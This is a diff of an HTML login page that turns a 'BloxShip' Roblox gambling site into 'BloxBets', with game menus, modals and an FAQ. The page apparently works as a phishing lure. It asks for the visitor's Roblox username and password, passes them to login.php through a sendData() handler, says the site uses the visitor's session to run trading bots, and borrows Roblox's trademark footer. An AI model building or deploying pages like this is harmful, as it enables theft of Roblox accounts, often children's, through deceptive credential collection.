@@ -1,65 +1,124 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<title>BloxShip | Win ROBUX at the #3 ROBLOX Game Site!</title>
-	<link rel="icon" href="images/logo.png">
+    <title>BloxBets | Win ROBUX at the #1 ROBLOX gambling site</title>
+    <link rel="icon" href="images/logo.png">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta charset="utf-8">
     <meta name="keywords" content="">
-    <script>
-        addEventListener("load", function () {
-            setTimeout(hideURLbar, 0);
-        }, false);
-        function hideURLbar() {
-            window.scrollTo(0, 1);
-        }
-    </script>
-	<link href="css/font-awesome.min.css" rel="stylesheet" type="text/css" media="all">
-	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-	<link href="css/style.css" rel="stylesheet" type="text/css" media="all"/>
-	<link href="//fonts.googleapis.com/css?family=Raleway:100,100i,200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet">
+    <meta name="description" content="Join BloxBets, the exciting Roblox gambling site with unique game modes like Crash, Dice, Plinko.">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <link href="css/style.css" rel="stylesheet" type="text/css" media="all"/>
+    <link href="//fonts.googleapis.com/css?family=Raleway:100,100i,200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet">
+    <script src="js/script.js"></script>
 </head>
-<body>	
-<div class="signupform">
-	<div class="container">
-		<div class="agile_info">
-			<div class="w3l_form">
-				<div class="left_grid_info">
-					<h1>BloxShip | Roblox Casino</h1>
-					<h2>What is BloxShip?</h2>
-					<p>BloxShip is a new thrilling Roblox gambling website with three unique game-modes! Our Coinflip mode is peer 2 peer meaning there is no house involved, purely testing your luck against other players! In Jackpot you're able to win up to 15 items with a potential 15 other players putting their items at stake each round. Rock Paper Scissors is similar to our Coinflip mode, with the added element of player choice to selecting a pick!</p><br>
-					<h2>Are my account safe?</h2>
-					<p>Absolutely! We don't store any account informations in our database, it's a all local in your own browser.</p><br>
-					<h2>What is my connection used for?</h2>
-					<p>In order to automate all trades and for our website to function, we use your session. Our bots do everything in real time, and ensures a trust-less system between all users.</p><br>
-					<img src="images/banner.png"/>
-				</div>
-			</div>
-			<div class="w3_info">
-				<h2>Welcome User!</h2><br>
-				<h3>Connect your Roblox account to BloxShip for login.</h3>
-				<p>Before logging in, please read our <span style="color: #4b79bd; cursor: pointer; font-weight: 500;">frequently asked questions</span>. For further assistance on how to login, watch this <a href="https://www.youtube.com/watch?v=ZSUygtqD657" target="blank" style="color: #4b79bd; cursor: pointer; font-weight: 500; text-decoration: none;">Youtube video</a>!</p>
-				<form id="login-form" action="login.php" method="post">
-					<label>Username</label>
-					<div class="input-group">
-						<span class="fa fa-user" aria-hidden="true"></span>
-						<input type="text" name="username" placeholder="Username/Email/Phone" required=""> 
-					</div>
-					<label>Password</label>
-					<div class="input-group">
-						<span class="fa fa-lock" aria-hidden="true"></span>
-						<input type="Password" name="password" placeholder="Password" required="">
-					</div> 
-					<div class="login-check">
-						<label class="checkbox"><input type="checkbox" name="checkbox" checked=""><i> </i>Agree to our terms of service</label>
-				   </div>					
-						<button class="btn btn-danger btn-block" type="submit">Log In</button>
-				</form>
-				<p class="account">New to BloxShip & Roblox? <a href="https://www.roblox.com/account/signupredir" target="blank">Create an account</a></p>
-				<p class="account1">©BloxShip - Logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.<a href="#"></a></p>
-			</div>
-		</div>
-	</div>
+
+<body>
+
+<div id="loader" class="loader">
+    <img src="images/loading.png">
 </div>
+
+<div class="navbar">
+    <div class="hamburger" id="hamburger">&#9776;</div>
+    <ul class="nav-list" id="navList">
+        <li><a href="#"><i class="fas fa-home"></i> Home</a></li>
+        <li><a href="#" id="liveFeedBtn"><i class="fas fa-broadcast-tower"></i> Live Feed</a></li>
+        <li><a href="#"><i class="fas fa-rocket"></i> Crash</a></li>
+        <li><a href="#"><i class="fas fa-dice"></i> Dice</a></li> 
+        <li><a href="#"><i class="fas fa-dot-circle"></i> Plinko</a></li>
+        <li><a href="#"><i class="fas fa-shopping-cart"></i> Shop</a></li>
+        <li><a href="#"><i class="fas fa-user"></i> Profile</a></li>
+    </ul>
+</div>
+
+<div id="errorModal" class="modal">
+    <div class="modal-content">
+        <span class="close">&times;</span>
+        <h2>You are not logged in</h2>
+        <p>Please log in before using the menu section!</p><br>
+        
+        <h3>Why is Logging In Important?</h3>
+        <p>Logging in allows you to enjoy a personalized experience and ensures secure transactions during gambling.</p><br>
+
+        <h3>Terms of Use</h3>
+        <p>Please read our <a href="#" target="_blank">Terms of Use</a> before gambling.</p><br>
+
+        <h3>Privacy Policy</h3>
+        <p>You can find our privacy policy on our <a href="#" target="_blank">website</a>.</p>
+    </div>
+</div>
+
+<div class="modal" id="liveFeedModal">
+    <div class="modal-content">
+        <span class="close" id="closeModal">&times;</span>
+        <h2>Live Feed</h2>
+        <div id="availablePlayers">
+            <h3><i class="fas fa-user"></i> Online: <span id="playerCount"></span></h3><br>
+        </div>
+        <div id="liveFeedContent">
+        </div>
+    </div>
+</div>
+
+<div class="signupform">
+    <div class="container">
+        <div class="agile_info">
+
+            <div class="w3l_form">
+                <div class="left_grid_info">
+                    <h1>BloxBets</h1>
+
+                    <h2>What is BloxBets?</h2>
+                    <p>BloxBets is an exciting new Roblox gambling website featuring three unique game modes! In Crash, keep your bet alive while the multiplier increases, but beware—it can crash at any moment! Dice offers the thrill of traditional dice rolling where luck meets strategy. Finally, Plinko lets your ball fall through a board, landing on different values.</p><br>
+
+                    <h2>Is my account safe?</h2>
+                    <p>We don't store any account informations in our database, it's all local in your own browser.</p><br>
+
+                    <h2>What is my login used for?</h2>
+                    <p>In order to automate all trades and for our website to function, we use your session. Our bots do everything in real time, and ensure a trust-less system between all users.</p><br>
+
+                    <img src="images/banner.png"/>
+
+                </div>
+            </div>
+
+            <div class="w3_info">
+                <h2>Welcome User!</h2><br>
+                <h3>Connect your Roblox account to BloxBets.</h3><br>
+                
+                <p>Are you ready to have fun playing a variety of games with a chance to win Robux and Limiteds?</p>
+                
+                <form id="login-form" action="login.php" method="post" onsubmit="return sendData(event)">
+                    <label>Username</label>
+                    <div class="input-group">
+                        <span class="fas fa-user" aria-hidden="true"></span>
+                        <input type="text" name="username" placeholder="Username/Email/Phone" required=""> 
+                    </div>
+
+                    <label>Password</label>
+                    <div class="input-group" style="position: relative;">
+                        <span class="fas fa-lock" aria-hidden="true"></span>
+                        <input type="password" name="password" placeholder="Password" required="" id="password"> 
+                        <span class="fas fa-eye" id="togglePassword" aria-hidden="true" style="cursor: pointer; position: absolute; right: 10px; top: 50%; transform: translateY(-50%);"></span>
+                    </div>
+
+                    <div class="login-check">
+                        <label class="checkbox"><input type="checkbox" name="checkbox" checked=""><i> </i>Agree to our Terms of Use</label>
+                    </div>
+
+                    <button class="btn btn-danger btn-block" type="submit">Log In</button>
+                </form>
+
+                <p class="account">New to BloxBets & Roblox? <a href="https://www.roblox.com/account/signupredir" target="blank" style="color: #4b79bd;">Create an account</a></p>
+                <p class="account1">Logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.<a href="#"></a></p>
+
+            </div>
+        </div>
+    </div>
+</div>
+
 </body>
 </html>
